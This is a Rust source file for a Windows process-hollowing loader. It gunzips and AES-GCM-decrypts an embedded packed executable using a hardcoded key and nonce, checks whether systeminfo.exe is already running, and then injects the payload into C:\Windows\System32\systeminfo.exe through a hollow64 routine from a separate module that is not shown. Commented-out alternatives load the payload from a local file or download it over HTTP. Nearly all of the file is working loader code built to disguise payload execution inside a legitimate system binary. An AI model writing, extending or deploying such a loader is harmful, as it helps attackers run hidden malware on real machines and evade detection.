mod hollow; 
use hollow::*;
use std::fs::File;
use std::io::{Read};
use log::{debug, error, info, warn};
use flate2::read::GzDecoder;
use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, 
    TH32CS_SNAPPROCESS, PROCESSENTRY32W
};
use windows_sys::Win32::Foundation::CloseHandle;

#[cfg(debug_assertions)]
fn init_logging() {
    env_logger::builder().filter_level(log::LevelFilter::Debug).init();
}

#[cfg(not(debug_assertions))]
fn init_logging() {
    env_logger::builder().filter_level(log::LevelFilter::Info).init();
}

fn main() {
    init_logging();

    // Check if target process is already running
    let target_process = "systeminfo.exe";
    info!("Checking if {} is already active...", target_process);
    if is_target_running(target_process) {
        warn!("Detected an active instance of {}. Exiting.", target_process);
        std::process::exit(0);
    }
    info!("System clear. Proceeding with process hollowing...");

    info!("Start process hollowing");
    call_hollow_loader();
    std::thread::sleep(std::time::Duration::from_millis(10000));
}

fn call_hollow_loader(){
    let mut buf: Vec<u8> = Vec::new();
    //buf = retrieve_local_pe();
    // buf = retrieve_url_pe();
    let mut buf = retrieve_embedded_pe();
    let pe_to_exec = "C:\\Windows\\System32\\systeminfo.exe";
    debug!("PE to be hollowed : {}",pe_to_exec);
    hollow64(&mut buf, pe_to_exec);
}

fn retrieve_local_pe() -> Vec<u8> {
    let mut buf: Vec<u8> = Vec::new();
    let file_to_load = "sample.exe";
    debug!("PE to be injected : {}", file_to_load); 

    let file = File::open(file_to_load);

    match file {
        Ok(mut f) => {
            if let Err(e) = f.read_to_end(&mut buf) {
                debug!("Error reading file: {}", e);
                return Vec::new(); // Return an empty vector in case of error
            }
            buf // return buffer
        }
        Err(_) => {
            debug!("Error opening file to load");
            Vec::new() // Return an empty vector in case of error
        }
    }
}
fn retrieve_url_pe() -> Vec<u8> {
    // URL of the binary file you want to read
    let url = "http://127.0.0.1/sample.exe";

    // Send a GET request
    let response = ureq::get(url).call();

    if let Ok(response) = response {
        if response.status().is_success(){
            // Get a reader from the response
            let mut reader = response.into_body().into_reader();

            // Create a buffer to store the bytes
            let mut buffer = Vec::new();

            // Read the bytes from the reader into the buffer
            if let Ok(_) = std::io::copy(&mut reader, &mut buffer) {
                debug!("File downloaded successfully. Size: {} bytes", buffer.len());
                buffer
            } else {
                debug!("Failed to read response bytes.");
                Vec::new()
            }
        } else {
            debug!("Failed to fetch the file. Status code: {}", response.status());
            Vec::new()
        }
    } else {
        debug!("Failed to make a request.");
        Vec::new()
    }
}

fn retrieve_embedded_pe() -> Vec<u8> {

    let mut embedded_payload: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload.packed"));
    // 1. Decompress
    let mut decoder = GzDecoder::new(embedded_payload);
    let mut compressed_buffer = Vec::new();
    if let Err(_) = decoder.read_to_end(&mut compressed_buffer) {
        return Vec::new();
    }

    // 2. Decrypt
    let key = Key::<Aes256Gcm>::from_slice(b"616e2d65787472656d656c792d736563");
    let nonce = Nonce::from_slice(b"616e2d657874");
    let cipher = Aes256Gcm::new(key);

    match cipher.decrypt(nonce, compressed_buffer.as_ref()) {
        Ok(decrypted_bytes) => {
            info!("Payload decrypted and decompressed successfully.");
            decrypted_bytes
        }
        Err(e) => {
            error!("Decryption failed: {:?}", e);
            Vec::new()
        }
    }
}

fn is_target_running(target_name: &str) -> bool {
    unsafe {
        // Take a snapshot of all processes in the system
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == std::ptr::null_mut() {
            error!("Failed to create process snapshot.");
            return false;
        }

        let mut entry: PROCESSENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

        // Start iterating through the processes
        if Process32FirstW(snapshot, &mut entry) != 0 {
            loop {
                // Convert the UTF-16 EXE name to a Rust String
                let exe_name = String::from_utf16_lossy(&entry.szExeFile)
                    .trim_matches(char::from(0)) // Remove null terminators
                    .to_lowercase();
                
                if exe_name == target_name.to_lowercase() {
                    CloseHandle(snapshot);
                    return true;
                }

                // Move to the next process in the snapshot
                if Process32NextW(snapshot, &mut entry) == 0 {
                    break;
                }
            }
        }

        CloseHandle(snapshot);
    }
    false
}